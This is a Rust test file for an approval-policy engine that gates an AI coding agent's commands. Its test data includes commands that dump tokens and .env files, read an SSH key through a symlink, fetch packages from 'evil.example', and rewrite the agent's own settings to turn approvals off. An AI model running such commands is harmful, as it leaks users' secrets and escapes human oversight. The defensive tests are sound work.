        let (_tmp, root) = worktree();
        std::fs::create_dir_all(root.join("src")).unwrap();
        std::fs::write(root.join("src/a.rs"), "fn main() {}").unwrap();
        for c in [
            "git status",
            "git diff --stat",
            "git -C src log --oneline -5",
            "cd src && git status",
            "ls",
            "ls -la src",
            "cat src/a.rs",
            "cat .env.example",
            "cat .claude/settings.json",
            "ls .claude",
            "grep -rn TOKEN src",
            "rg -n 'process.env' src",
            "jq '.env' package.json",
            "jq -r '.scripts.test' package.json",
            "find . -name '.env*'",
            "cargo test",
            "cargo test -p core -- --nocapture",
            "pnpm test",
            "npm test",
            "pytest",
            "pytest -q tests/test_env.py",
            "uv run pytest -q",
            "go test ./...",
            // reads and tests that only name an agent's settings, `.git` or an env file
            "[[ -d .git ]] && git status",
            "tree -a -I .git",
            "fd -H -E .git foo",
            "git diff -- .claude/skills/x.md",
            "git log --oneline -- .cursor/rules",
            "sed -n 1,20p .claude/settings.json",
            "node --env-file=.env.test --test",
            "uv run --env-file .env pytest",
            // patterns that name every file, or none of the guarded ones
            "cat *",
            "grep -n foo *",
            "wc -l src/*.rs",
            "ls src/{a,b}.rs",
            "grep -e '.e*' src/a.rs",
        ] {
            let v = eval_in(&root, ApprovalMode::Balanced, false, command(c, &root));
            assert!(matches!(v, Verdict::Allow { .. }), "{c}: {v:?}");
        }
        // A worker allowed to work alone also sets a project up without a prompt.
        for c in [
            "cp .env.example .env",
            "echo .env >> .gitignore",
            "tar --exclude=.claude -czf out.tgz src",
            "node scripts/gen.js",
            "[[ -f .env ]] || cp .env.example .env",
            "bash -c 'cp .env.example ./.env'",
            "mkdir -p src/{a,b}/{x,y}",
            "chmod 644 *.json",
            "sed -i -e 's/.*/x/' notes.txt",
        ] {
            let v = eval_in(&root, ApprovalMode::Autonomous, false, command(c, &root));
            assert!(matches!(v, Verdict::Allow { .. }), "{c}: {v:?}");
        }
        // Reading an agent's settings is no reason to stop a worker with full access.
        for c in ["git diff -- .claude/skills/x.md", "sed -n 1,20p .claude/settings.json", "tree -a -I .git"] {
            let v = eval_in(&root, ApprovalMode::Full, false, command(c, &root));
            assert!(matches!(v, Verdict::Allow { .. }), "{c}: {v:?}");
        }
    }

    /// security#5: an agent that rewrites its own CLI settings could switch approvals off.
    #[test]
    fn agent_settings_changes_ask_in_every_mode() {
        let wt = Path::new("/w/t1");
        for c in [
            "mkdir -p .claude && printf '{\"permissions\":{\"allow\":[\"Bash\"]}}' > .claude/settings.local.json",
            "echo '{}' > .mcp.json",
            "echo '{}' >> opencode.json",
            "tee .claude/settings.local.json",
            "cp /w/t1/x.json .codex/config.toml",
            "mv x.json .gemini/settings.json",
            "sed -i '' s/ask/allow/ .opencode/config.json",
            "cd .claude && ls",
            "python3 gen.py --out=.cursor/cli.json",
            "touch .Claude/settings.local.json",
            "bash -c 'echo x > .claude/settings.json'",
            "rm .mcp.json",
            // The name behind a pattern, a brace list or an option it is glued to.
            "cd .cl* && echo '{\"permissions\":{\"allow\":[\"Bash\"]}}' > settings.local.json",
            "mkdir -p .{claude,x}",
            "sort -o.claude/settings.local.json x",
            "sort ''{-o,.claude/settings.local.json} x",
            "echo x > .cl*/settings.local.json",
            "cp x.json .c[l]aude/settings.json",
            "tee .{mcp,x}.json",
            "sed -i s/ask/allow/ o*.json",
        ] {
            for mode in [ApprovalMode::Balanced, ApprovalMode::Autonomous, ApprovalMode::Full] {
                let v = eval_in(wt, mode, false, command(c, wt));
                assert!(asks_about(&v, classify::AGENT_SETTINGS), "{c} in {mode:?}: {v:?}");
            }
        }
        for p in [".claude/settings.local.json", "/w/t1/.mcp.json", "sub/.codex/config.toml", "/home/me/.claude/settings.json"] {
            let edit = ApprovalSubject::FileChange { paths: vec![p.into()], diff: None };
            assert!(asks_about(&eval_in(wt, ApprovalMode::Full, false, edit), classify::AGENT_SETTINGS), "{p}");
        }
        let write = ApprovalSubject::Tool { name: "write_file".into(), input: serde_json::json!({ "file_path": ".gemini/settings.json" }) };
        assert!(asks_about(&eval_in(wt, ApprovalMode::Autonomous, false, write), classify::AGENT_SETTINGS));
        let read = ApprovalSubject::Tool { name: "Read".into(), input: serde_json::json!({ "file_path": ".claude/settings.json" }) };
        assert!(matches!(eval_in(wt, ApprovalMode::Balanced, false, read), Verdict::Allow { .. }), "reading them is fine");
        // git's own files are guarded too (hooks and config name programs git runs), below full mode.
        for c in ["cp hook.sh .git/hooks/pre-commit", "echo x >> .git/config", "chmod +x .git/hooks/post-merge"] {
            let v = eval_in(wt, ApprovalMode::Autonomous, false, command(c, wt));
            assert!(asks_about(&v, classify::GIT_INTERNALS), "{c}: {v:?}");
        }
        assert!(matches!(eval_in(wt, ApprovalMode::Balanced, false, command("cat .git/HEAD", wt)), Verdict::Allow { .. }));
        // A worktree that itself lives under `.claude/` is not its own settings.
        let nested = Path::new("/repo/.claude/worktrees/t1");
        let edit = ApprovalSubject::FileChange { paths: vec!["/repo/.claude/worktrees/t1/src/a.rs".into()], diff: None };
        assert!(matches!(eval_in(nested, ApprovalMode::Autonomous, false, edit), Verdict::Allow { .. }));
        let v = eval_in(nested, ApprovalMode::Autonomous, false, command("cargo test --manifest-path /repo/.claude/worktrees/t1/Cargo.toml", nested));
        assert!(matches!(v, Verdict::Allow { .. }), "{v:?}");
    }

    /// security#6: one auto-approved command must not put the user's tokens in the transcript.
    #[test]
    fn commands_that_show_secrets_ask() {
        let wt = Path::new("/w/t1");
        for c in [
            "printenv",
            "printenv GITHUB_TOKEN",
            "env",
            "env | grep -i token",
            "env -0",
            "set",
            "export -p",
            "export",
            "declare -x",
            "jq -n env",
            "jq -n '$ENV.GITHUB_TOKEN'",
            "jq -n 'env.HOME'",
            "cat .env",
            "cat .env.local",
            "head -5 config/.env.production",
            "grep KEY .env",
            "cat .env*",
            "base64 certs/server.key",
            "cat deploy/id_ed25519",
            "sort < .env",
            "bash -c 'cat .env'",
            // The shell turns these into `.env` or a private key.
            "cat .e*",
            "cat .e{nv,x}",
            "cat .[e]nv",
            "cat -- .en?",
            "head -3 id_*",
            "grep -f.env src/a.rs",
        ] {
            for (mode, read_only) in [(ApprovalMode::Balanced, false), (ApprovalMode::Autonomous, false), (ApprovalMode::Balanced, true)] {
                let v = eval_in(wt, mode, read_only, command(c, wt));
                assert!(asks_about(&v, classify::SECRETS), "{c} in {mode:?}: {v:?}");
            }
        }
        // A filter file cannot be read here, so it is not a read-only command.
        assert_eq!(classify_command("jq -f filter.jq data.json", &[]), None);
        assert_eq!(classify_command("printenv PATH", &[]), None);
        let read = ApprovalSubject::Tool { name: "read".into(), input: serde_json::json!({ "filePath": "/w/t1/.env", "_kind": "read" }) };
        assert!(asks_about(&eval_in(wt, ApprovalMode::Balanced, false, read), classify::SECRETS));
    }

    /// security#7: a "test runner" that downloads and runs a package is not a test run.
    #[test]
    fn runners_that_fetch_packages_ask() {
        let (_tmp, root) = worktree();
        std::fs::create_dir_all(root.join("node_modules/.bin")).unwrap();
        std::fs::write(root.join("node_modules/.bin/vitest"), "").unwrap();
        std::fs::write(root.join("node_modules/.bin/tsc"), "").unwrap();
        std::fs::create_dir_all(root.join("packages/web")).unwrap();
        let balanced = |c: &str| eval_in(&root, ApprovalMode::Balanced, false, command(c, &root));
        // installed in the project: npx runs the local copy
        for c in ["npx vitest run", "npx tsc -p tsconfig.json --noEmit", "bunx vitest", "npm exec vitest run", "cd packages/web && npx vitest run"] {
            assert!(matches!(balanced(c), Verdict::Allow { .. }), "{c}: {:?}", balanced(c));
        }
        for c in [
            "npx jest",                    // not installed: npx would download it
            "npx pytest",                  // an npm package that only shares the tool's name
            "npx ruff check",
            "npx vitest@latest run",
            "npx -p evil vitest",
            "npm exec jest",
            "bunx eslint .",
            "pnpm dlx vitest",
            "uvx ruff check",
            "uv tool run ruff check",
            "uv run --with=evil pytest",
            "uv run --with evil pytest",
            "uv run --index-url=https://evil.example pytest",
            "pipx run pytest",
            "tox",
            "nox -s tests",
        ] {
            for mode in [ApprovalMode::Balanced, ApprovalMode::Autonomous] {
                let v = eval_in(&root, mode, false, command(c, &root));
                assert!(asks_about(&v, "network"), "{c} in {mode:?}: {v:?}");
            }
        }
        // No worktree to look in: nothing says the tool is installed.
        assert!(command_risks("npx vitest run", None, None, 0).iter().any(|r| r == "network (npx)"));
        assert_eq!(classify_command("uv run --with=evil pytest", &[]), None);
        assert_eq!(classify_command("uv run pytest", &[]), Some("test runner"));
        assert_eq!(classify_command("pnpm exec pytest", &[]), Some("test runner"));
    }

    /// security#11: a symlink in the repo must not carry a read or a write out of the worktree.
    #[test]
    fn symlinks_do_not_hide_what_is_outside() {
        let (_tmp, top) = worktree();
        let root = top.join("wt");
        std::fs::create_dir_all(root.join("docs")).unwrap();
        std::fs::create_dir_all(top.join("home/.ssh")).unwrap();
        std::fs::write(top.join("home/.ssh/key"), "secret").unwrap();
        std::fs::write(root.join("docs/a.md"), "x").unwrap();
        std::os::unix::fs::symlink(top.join("home"), root.join("docs/ref")).unwrap();
        std::os::unix::fs::symlink("a.md", root.join("docs/alias.md")).unwrap();
        std::os::unix::fs::symlink(top.join("home/new-file"), root.join("dangling")).unwrap();
        for c in [
            "cat docs/ref/.ssh/key",
            "ls docs/ref",
            "cd docs/ref && ls",
            "cat docs/ref/../home/.ssh/key",
            "cat missing/../docs/ref/.ssh/key",
            "echo x > dangling",
            "echo x > docs/ref/new",
        ] {
            for (mode, read_only) in [(ApprovalMode::Balanced, false), (ApprovalMode::Autonomous, false), (ApprovalMode::Balanced, true)] {
                let v = eval_in(&root, mode, read_only, command(c, &root));
                assert!(asks_about(&v, "outside worktree"), "{c} in {mode:?}: {v:?}");
            }
        }
        for c in ["cat docs/alias.md", "cat docs/a.md", "ls docs", "cat docs/not-there.md"] {
            let v = eval_in(&root, ApprovalMode::Balanced, false, command(c, &root));
            assert!(matches!(v, Verdict::Allow { .. }), "a link that stays inside is fine: {c}: {v:?}");
        }
        let read = |p: &str| ApprovalSubject::Tool { name: "Read".into(), input: serde_json::json!({ "file_path": p }) };
        assert!(asks_about(&eval_in(&root, ApprovalMode::Balanced, true, read("docs/ref/.ssh/key")), "outside worktree"));
        assert!(matches!(eval_in(&root, ApprovalMode::Balanced, true, read("docs/alias.md")), Verdict::Allow { .. }));
        let edit = ApprovalSubject::FileChange { paths: vec![root.join("docs/ref/x").to_string_lossy().into_owned()], diff: None };
        assert!(asks_about(&eval_in(&root, ApprovalMode::Autonomous, false, edit), "outside worktree"));
        // The worktree itself may be reached through a link (macOS: /tmp -> /private/tmp).
        std::os::unix::fs::symlink(&root, top.join("wt-link")).unwrap();
        let via = top.join("wt-link");
        assert!(matches!(eval_in(&via, ApprovalMode::Balanced, false, command("cat docs/a.md", &via)), Verdict::Allow { .. }));
        assert!(asks_about(&eval_in(&via, ApprovalMode::Balanced, false, command("cat docs/ref/.ssh/key", &via)), "outside worktree"));
    }

    /// security#11: git run inside a repository that sits in the worktree reads that
    /// repository's config and runs the programs it names.
    #[test]
    fn git_in_a_nested_repository_asks() {
        let (_tmp, root) = worktree();
        for d in ["vendor/bare/objects", "vendor/bare/refs", "vendor/bare/deep", "sub/.git", "src/app"] {
            std::fs::create_dir_all(root.join(d)).unwrap();
        }
        std::fs::write(root.join("vendor/bare/HEAD"), "ref: refs/heads/main\n").unwrap();
        std::fs::write(root.join(".git"), "gitdir: /elsewhere\n").unwrap(); // the worktree's own
        for c in [
            "git -C vendor/bare status",
            "git -C vendor -C bare status",
            "cd vendor/bare && git status",
            "cd vendor/bare/deep && git log -1",
            "cd vendor/bare",
            "git --git-dir=vendor/bare status",
            "git --git-dir vendor/bare log",
            "GIT_DIR=vendor/bare git status",
            "git -C sub status",
            "cd sub && git diff",
        ] {
            for (mode, read_only) in [(ApprovalMode::Balanced, false), (ApprovalMode::Autonomous, false), (ApprovalMode::Balanced, true)] {
                let v = eval_in(&root, mode, read_only, command(c, &root));
                assert!(asks_about(&v, NESTED_REPO), "{c} in {mode:?}: {v:?}");
            }
        }
        let inside = command("git status", &root.join("vendor/bare"));
        assert!(asks_about(&eval_in(&root, ApprovalMode::Autonomous, false, inside), NESTED_REPO), "the command's own cwd counts");
        for c in ["git -C src/app status", "cd src/app && git diff --stat", "git status", "ls vendor/bare", "cat vendor/bare/HEAD"] {
            let v = eval_in(&root, ApprovalMode::Balanced, false, command(c, &root));
            assert!(matches!(v, Verdict::Allow { .. }), "{c}: {v:?}");
        }
        assert_eq!(classify_command("git --git-dir=x status", &[]), None);
        assert_eq!(classify_command("git --work-tree x status", &[]), None);
    }

    /// security#14: an ACP request is named by a free-text title; the protocol kind decides.
    #[test]
    fn acp_tools_are_judged_by_kind_too() {
        let wt = Path::new("/w/t1");
        let tool = |name: &str, input: serde_json::Value| ApprovalSubject::Tool { name: name.into(), input };
        let balanced = |s: ApprovalSubject| eval_in(wt, ApprovalMode::Balanced, false, s);
        for (name, kind) in [("read", "read"), ("list", "read"), ("glob", "search"), ("grep", "search"), ("find", "search")] {
            let v = balanced(tool(name, serde_json::json!({ "path": "src", "_kind": kind })));
            assert!(matches!(v, Verdict::Allow { .. }), "{name} ({kind}): {v:?}");
        }
        // The same titles on a tool that does not read (a third-party MCP tool) ask.
        for name in ["read", "list", "view", "find", "grep"] {
            let v = balanced(tool(name, serde_json::json!({ "_kind": "other" })));
            assert!(matches!(v, Verdict::Ask { .. }), "{name}: {v:?}");
        }
        // Without a kind the request is not from ACP: only Claude's own names count.
        assert!(matches!(balanced(tool("Read", serde_json::json!({ "file_path": "src/a.rs" }))), Verdict::Allow { .. }));
        assert!(matches!(balanced(tool("list", serde_json::json!({}))), Verdict::Ask { .. }));
        assert!(matches!(balanced(tool("todowrite", serde_json::json!({ "_kind": "other" }))), Verdict::Allow { .. }));
        // A fetch is network whatever its title says, also in autonomous mode.
        for input in [serde_json::json!({ "_kind": "fetch" }), serde_json::json!({ "url": "https://example.com/?q=secret" })] {
            let v = eval_in(wt, ApprovalMode::Autonomous, false, tool("https://example.com/?q=secret", input));
            assert!(asks_about(&v, "network"), "{v:?}");
        }
    }

    #[test]
    fn zsh_glob_qualifiers_are_not_checkable() {
        for c in ["ls *(e:true:)", "ls **/*(+evil)", "cat =(curl x)", "ls @(a|b)"] {
            assert!(parse(c).complex, "{c}");
            assert!(risks(c).iter().any(|r| r.contains("cannot be checked")), "{c}");
        }
    }

    #[test]
    fn full_mode_allows_everything_but_the_floors() {
        protect_dir(Path::new("/full/data"));
        let wt = "/full/data/worktrees/repo/p/t1";
        let approval = |subject| Approval {
            id: "ap".into(),
            agent_id: "a".into(),
            run_id: "r".into(),
            task_id: None,
            call_id: None,
            subject,
            reason: None,
            choices: vec![ApprovalChoice::AllowOnce, ApprovalChoice::Deny],
            risks: vec![],
            status: ApprovalStatus::Pending,
            decided_by: None,
            created_at: 0,
        };
        let cmd = |c: &str, cwd: &str| approval(ApprovalSubject::Command { command: c.into(), cwd: Some(cwd.into()) });
        let eval = |a: &Approval, read_only| {
            evaluate(a, &PolicyCtx { mode: ApprovalMode::Full, worktree: Some(Path::new(wt)), verify: &[], read_only, edits: false, checkout: None, own_mcp: &[], provider: Some(Provider::Claude) })
        };
        let allowed = |v: Verdict| matches!(v, Verdict::Allow { choice: ApprovalChoice::AllowOnce, .. });

        assert!(allowed(eval(&cmd("git push", wt), false)));
        assert!(allowed(eval(&cmd("rm -rf build", wt), false)));
        assert!(allowed(eval(&cmd("ls", "/tmp/elsewhere"), false)), "a cwd outside the worktree");

        let q = approval(ApprovalSubject::Question { questions: serde_json::json!([{ "question": "Which DB?" }]) });
        assert!(!allowed(eval(&q, false)));
        let p = approval(ApprovalSubject::Permissions { detail: serde_json::json!({}) });
        assert!(!allowed(eval(&p, false)));
        let plan = approval(ApprovalSubject::Tool { name: "ExitPlanMode".into(), input: serde_json::json!({ "plan": "1. Add the line" }) });
        let v = eval(&plan, false);
        assert!(matches!(&v, Verdict::Ask { reason } if reason == "the agent shows you its plan"), "a plan is yours to accept: {v:?}");
        assert!(!allowed(eval(&cmd("npm install", wt), true)), "read-only agents never get writes");
        assert!(!allowed(eval(&cmd("touch a", wt), true)));
        assert!(allowed(eval(&cmd("git log -5", wt), true)));
        let v = eval(&cmd("cat /full/data/runs/r1/claude-mcp.json", wt), false);
        assert!(matches!(&v, Verdict::Ask { reason } if reason.contains(CODLY_DATA)), "{v:?}");
        assert!(!allowed(eval(&cmd("cat ../../../../runs/r1/claude-mcp.json", wt), false)));
        assert!(!allowed(eval(&cmd("cat ../t2/.env", wt), false)), "another task's worktree is Codly data too");
        assert!(allowed(eval(&cmd("cat src/a.rs", wt), false)));
        assert!(!allowed(eval(&cmd("ls", "/full/data/runs"), false)));

        let mut a = cmd("git push", wt);
        a.choices = vec![ApprovalChoice::AllowAlways, ApprovalChoice::Deny];
        assert!(matches!(eval(&a, false), Verdict::Ask { .. }), "no allow_once offered");
    }

    /// `cmd >&file` sends stdout and stderr to the file: it is a write, not a copy of a
    /// descriptor. `>|` and zsh's `>!` write too.
    #[test]
    fn a_file_after_a_redirect_is_a_write() {
        let writes = |c: &str| parse(c).writes.iter().map(|w| w.text.clone()).collect::<Vec<_>>();
        for (c, file) in [
            ("cmd >&out.log", "out.log"),
            ("cmd >& out.log", "out.log"),
            ("cmd >>&out.log", "out.log"),
            ("cmd 2>&out.log", "out.log"),
            ("cmd >&2file", "2file"),
            ("cmd &>out.log", "out.log"),
            ("cmd >|out.log", "out.log"),
            ("cmd >!out.log", "out.log"),
            ("cmd >>| out.log", "out.log"),
            ("cmd >&|out.log", "out.log"),
            ("cmd &>!out.log", "out.log"),
            ("cmd 2>|out.log", "out.log"),
        ] {
            assert_eq!(writes(c), [file], "{c}");
            assert_eq!(texts(&parse(c).segments), vec![vec!["cmd"]], "{c}");
        }
        for c in ["cmd 2>&1", "cmd >&2", "cmd >&-", "cmd 2>&1-", "cmd 3>&1 1>&2", "cmd >&2; ls"] {
            assert!(writes(c).is_empty(), "{c}");
        }
        assert_eq!(texts(&parse("cmd 2>&1|tail -5").segments), vec![vec!["cmd"], vec!["tail", "-5"]]);
        assert_eq!(texts(&parse("cmd >&2 arg").segments), vec![vec!["cmd", "arg"]]);

        // The file is checked like any other file a line writes.
        let wt = Path::new("/w/t1");
        for c in ["echo '{}' >&.claude/settings.local.json", "echo '{}' >!.claude/settings.local.json", "echo '{}' >|.mcp.json"] {
            for mode in [ApprovalMode::Balanced, ApprovalMode::Autonomous, ApprovalMode::Full] {
                let v = eval_in(wt, mode, false, command(c, wt));
                assert!(asks_about(&v, classify::AGENT_SETTINGS), "{c} in {mode:?}: {v:?}");
            }
        }
        for c in ["ls >&/tmp/out.log", "ls >&~/out.log", "ls >!../out.log", "ls >&$OUT"] {
            assert!(risks(c).iter().any(|r| r == "outside worktree"), "{c}: {:?}", risks(c));
        }
        assert_eq!(classify_command("ls >&out.log", &[]), None, "a write is not a read-only command");
        assert_eq!(classify_command("ls >&2", &[]), Some(READ_ONLY));
        assert_eq!(classify_command("cargo test 2>&1 | tail -5", &[]), Some(TEST_RUNNER));
    }

    /// `make`, `just`, `task` and `ninja` run every target on the line: only a line whose
    /// targets are all checks is a test run.
    #[test]
    fn only_check_targets_are_a_test_run() {
        for c in [
            "make test",
            "make check lint",
            "make build",
            "make fmt",
            "make format",
            "make typecheck",
            "make -j8 test",
            "make -C web test",
            "make -f ci.mk tests",
            "make test V=1",
            "make test 2>&1 | tail -20",
            "cd web && make lint",
            "just test",
            "just -f other.just typecheck",
            "just -d web fmt",
            "just test FEATURES=all",
            "task lint",
            "task -d web test",
            "ninja test",
            "ninja -C out build",
            // the value of an option, in the next word
            "make -j 8 test",
            "make -k -j 2 check",
            "make -kj 2 check",
            "make -j test",
            "make --jobs 4 test",
            "make --jobs=4 test",
            "make -l 2.5 test",
            "make -I dir test",
            "make -o old.o test",
            "make -W src/a.c build",
            "make --directory web test",
            "make --directory=web test",
            "make --file ci.mk tests",
            "make --include-dir inc test",
            "make -C web -j 8 test lint",
            "ninja -j 8 test",
            "ninja -k 0 test",
            "ninja -l 4 build",
            "ninja -j8 -C out test",
        ] {
            assert_eq!(classify_command(c, &[]), Some(TEST_RUNNER), "{c}");
        }
        for c in [
            "make",
            "make deploy",
            "make test deploy",
            "make deploy test",
            "make test install",
            "make all",
            "make -C web",
            "make test-deploy",
            // the number or the folder is no target, and what is left must be a check
            "make -j 8",
            "make -j 8 deploy",
            "make -j test deploy",
            "make -j 8 test deploy",
            "make -I deploy",
            "make --directory web",
            "make --directory web deploy",
            "make --jobs deploy",
            // a count of jobs is whole: `2.5` is a target here
            "make -j 2.5 test",
            // an option that is not read: the word after it stays a target
            "make --makefile ci.mk test",
            "make --old-file old.o test",
            "ninja -j 8 install",
            "ninja -t clean",
            "ninja -d stats test",
            "ninja --directory out test",
            "just",
            "just deploy",
            "just test unit",
            "just -c sh test",
            "task test release",
            "task -f deploy test",
            "ninja",
            "ninja test install",
            "ninja test A=b",
        ] {
            assert_eq!(classify_command(c, &[]), None, "{c}");
        }
    }

    /// Publishing, and commands that change your account at a registry, ask under the same
    /// name as `npm publish`.
    #[test]
    fn publish_like_commands_are_a_publish() {
        for c in [
            "npm publish",
            "pnpm publish -r",
            "yarn npm publish",
            "bun publish",
            "npm unpublish left-pad@1.0.0",
            "npm deprecate left-pad 'old'",
            "npm owner add someone left-pad",
            "npm access public left-pad",
            "npm dist-tag add left-pad@1.0.0 latest",
            "npm token create",
            "npm login",
            "npm logout",
            "npm adduser",
            "cargo publish",
            "cargo yank --version 1.0.0",
            "cargo owner --add someone",
            "cargo login abc",
            "cargo logout",
            "poetry publish",
            "uv publish",
            "deno publish",
            "gem push pkg-1.0.0.gem",
            "gem yank pkg -v 1.0.0",
            "twine upload dist/pkg.tar.gz",
            "python -m twine upload dist/pkg.tar.gz",
            "mvn clean deploy",
            "./gradlew build publish",
            "gradle :app:publishToMavenLocal",
            "timeout 60 npm publish",
            "sh -c 'cargo yank --version 1.0.0'",
            "cd web && npm publish 2>&1 | tail -5",
            // behind an option's value or a workspace's name
            "pnpm --filter web publish",
            "pnpm -F web publish",
            "pnpm -C packages/web publish",
            "pnpm --filter=web publish",
            "pnpm -r publish --tag next",
            "npm --workspace web publish",
            "npm -w web publish",
            "npm --prefix web publish",
            "npm --registry https://r.example publish",
            "npm --otp 123456 --tag next publish",
            "npm -w web token create",
            "yarn --cwd web publish",
            "yarn workspace web npm publish",
            "yarn workspaces foreach -A npm publish",
            "bun --cwd web publish",
            "cargo +nightly publish",
            "cargo --manifest-path web/Cargo.toml publish",
            "uv --directory web publish",
            "poetry -C web publish",
            // behind a package runner: the command it starts is read like the plain one
            "pnpm exec npm publish",
            "npx npm publish",
            "bunx npm publish",
            "npx -y npm publish",
            "npm exec -- npm publish",
            "npm x npm publish",
            "yarn dlx npm publish",
            "pnpm --filter web exec npm publish",
            "pnpm exec env CI=1 npm publish",
            "pnpm exec sh -c 'npm publish'",
            "npx npx npm publish",
            "pnpm exec cargo publish",
            "pnpm exec npm token create",
            "npx npm login",
            // behind the runner's own options, with a value or without
            "npm exec -w web -- npm publish",
            "npm exec --workspace web -- npm publish",
            "npm exec --prefix web -- npm publish",
            "npm exec -w web npm publish",
            "npm exec --workspace=web npm publish",
            "npx --registry http://localhost:4873 npm publish",
            "npx --registry http://localhost:4873 -- npm publish",
            "npx --no-install npm publish",
            // a line for a shell
            "npx -c 'npm publish'",
            "bunx -c 'npm publish'",
            "npx --call 'npm publish'",
            "npx --call='npm publish'",
            "npx -y -c 'cd web && npm publish'",
            "npm exec -c 'npm publish'",
            "bun exec 'npm publish'",
            "bun exec npm publish",
            "bun exec 'ls && npm publish'",
            "bun --cwd web exec 'npm publish'",
            "bun exec -- 'npm publish'",
        ] {
            assert!(risks(c).iter().any(|r| r == "publish"), "{c}: {:?}", risks(c));
        }
        for c in [
            "npm install",
            "npm install token",
            "npm install -D token",
            "npm run publish-docs",
            "npm run build -- publish",
            "npm test -- token",
            "pnpm --filter web add left-pad",
            "pnpm --filter web run build",
            "pnpm -r run build -- publish",
            "npm --prefix web install",
            "yarn workspace web add left-pad",
            "yarn workspace publish add left-pad",
            "yarn workspaces foreach -A run build",
            "cargo +nightly build",
            "yarn npm info left-pad",
            "cargo build",
            "cargo add owner",
            "gem install rails",
            "uv pip install twine",
            "mvn test",
            "gradle build",
            "pnpm exec vitest run",
            "pnpm exec npm run build",
            "pnpm exec echo publish",
            "npx prettier --check .",
            "npx -p npm publish-docs",
            "npx -c 'npm run build'",
            "npx eslint -c publish.json .",
            "pnpm exec vitest run -- publish",
            "bun exec 'npm run build'",
            "bun exec 'echo npm publish'",
        ] {
            assert!(!risks(c).iter().any(|r| r == "publish"), "{c}: {:?}", risks(c));
        }
        // A line for a shell that is nested too deep to read is dynamic code.
        assert!(command_risks("bun exec 'npm publish'", None, None, 3).iter().any(|r| r == "runs dynamic code"));
        // The tool's own options and arguments are not the runner's: nothing is read from them.
        for c in ["npx -y prettier --check .", "npx eslint -c .eslintrc.json .", "npx --no-install eslint -- .", "pnpm exec eslint -- ."] {
            assert!(!risks(c).iter().any(|r| r == "runs dynamic code"), "{c}: {:?}", risks(c));
        }
        // pnpm runs the words in a shell with `--shell-mode`, as with `-c`.
        for c in ["pnpm --shell-mode exec 'npm publish'", "pnpm exec --shell-mode 'npm publish'", "pnpm -c exec 'npm publish'"] {
            assert!(risks(c).iter().any(|r| r == "runs dynamic code"), "{c}: {:?}", risks(c));
        }
        // `cargo login` is your account, not a download a saved rule may cover.
        assert_eq!(risks("cargo login abc"), ["publish"]);
    }

    /// The subcommand of npm, pnpm, yarn and bun is read wherever it stands: behind an
    /// option's value, behind a workspace's name, and behind a package runner. The plain
    /// forms are read as before.
    #[test]
    fn a_package_managers_subcommand_is_read_wherever_it_stands() {
        for c in [
            // the plain forms
            "pnpm add left-pad",
            "npm install",
            "npm ci",
            "npm i -D left-pad",
            "npm install --prefix web",
            "yarn add left-pad",
            "bun add left-pad",
            "pnpm -r update",
            "pnpm dlx create-vite app",
            // behind an option's value
            "pnpm --filter web add left-pad",
            "pnpm -F web add left-pad",
            "pnpm --filter=web add left-pad",
            "pnpm --filter web --filter api add left-pad",
            "pnpm -C packages/web install",
            "pnpm --dir packages/web install",
            "pnpm -w add left-pad",
            "npm --prefix web install",
            "npm -w web install left-pad",
            "npm --workspace web ci",
            "yarn --cwd web add left-pad",
            "bun --cwd web add left-pad",
            "yarn workspace web add left-pad",
            // in each workspace, behind the options of `foreach`, with a value or without
            "yarn workspaces foreach add left-pad",
            "yarn workspaces foreach -A add left-pad",
            "yarn workspaces foreach --all remove left-pad",
            "yarn workspaces foreach -Apt up left-pad",
            "yarn workspaces foreach --include web add left-pad",
            "yarn workspaces foreach -A --exclude web --jobs 2 add left-pad",
            "yarn workspaces foreach --since=main add left-pad",
            "yarn --cwd web workspaces foreach -A add left-pad",
            // behind a package runner
            "pnpm exec npm install left-pad",
            "npx npm install left-pad",
            "bunx npm install left-pad",
            "npm exec -- pnpm add left-pad",
            "pnpm --filter web exec npm install",
            "pnpm exec pip install requests",
            "pnpm exec env CI=1 npm ci",
            "npx npx npm install left-pad",
            "npm exec -w web -- npm install left-pad",
            "npx -c 'npm install left-pad'",
            "bun exec 'npm install left-pad'",
        ] {
            assert!(risks(c).iter().any(|r| r == PACKAGE_INSTALL), "{c}: {:?}", risks(c));
        }
        // A script, a test run or a tool of the project, behind the same options: no risk.
        for c in [
            "pnpm --filter web run build",
            "pnpm --filter web test",
            "pnpm -F web build",
            "pnpm -r run build",
            "pnpm -w run ci",
            "npm --prefix web run build",
            "npm -w web test",
            "npm run add-user",
            "npm test -- add",
            "yarn workspace web build",
            "yarn --cwd web test",
            "yarn workspaces foreach -A run build",
            "yarn workspaces foreach -pt run test",
            "yarn workspaces foreach -A exec tsc --noEmit",
            "yarn workspaces list",
            "bun run build",
            "pnpm exec vitest run",
            "pnpm exec tsc --noEmit",
        ] {
            assert!(risks(c).is_empty(), "{c}: {:?}", risks(c));
        }
        // An install for the whole machine and `sudo` are seen behind the same words.
        for (c, risk) in [
            ("npx npm install -g typescript", "outside worktree"),
            ("pnpm exec npm install --global typescript", "outside worktree"),
            ("yarn --cwd web global add typescript", "outside worktree"),
            ("pnpm exec sudo npm install", "sudo"),
            ("pnpm exec git push", "push"),
            ("bun exec 'git push'", "push"),
            ("npx -c 'git push'", "push"),
            ("npx rm -rf dist", "deletes files"),
        ] {
            assert!(risks(c).iter().any(|r| r == risk), "{c}: {:?}", risks(c));
        }
        // The test runs that balanced mode allows stay test runs.
        for c in ["pnpm exec vitest run", "pnpm --filter web test", "pnpm -F web exec vitest run", "npm --prefix web test"] {
            assert_eq!(classify_command(c, &[]), Some(TEST_RUNNER), "{c}");
        }
    }

    /// A write to a package manager's settings changes your own setup, for every project: it
    /// asks in every mode but full access. A command that only reads them does not.
    #[test]
    fn writes_to_a_package_managers_settings_ask() {
        let wt = Path::new("/w/t1");
        for c in [
            "npm config set registry http://localhost:4873",
            "npm config delete registry",
            "npm config edit",
            "npm config --global set registry http://localhost:4873",
            "npm set registry http://localhost:4873",
            "npm --prefix web config set registry http://localhost:4873",
            "pnpm config set store-dir .pnpm-store",
            "pnpm -C web config set registry http://localhost:4873",
            "yarn config set registry http://localhost:4873",
            "yarn config delete registry",
            "yarn config unset npmRegistryServer",
            "pip config set global.index-url http://localhost:3141",
            "pip config unset global.index-url",
            "pip config edit --editor vi",
            "pip3 config set global.index-url http://localhost:3141",
            "python -m pip config set global.index-url http://localhost:3141",
            "poetry config virtualenvs.in-project true",
            "poetry config repositories.local http://localhost:3141",
            "poetry config --unset repositories.local",
            "poetry config --local virtualenvs.create false",
            "gem sources --add http://localhost:9292",
            "gem sources -a http://localhost:9292",
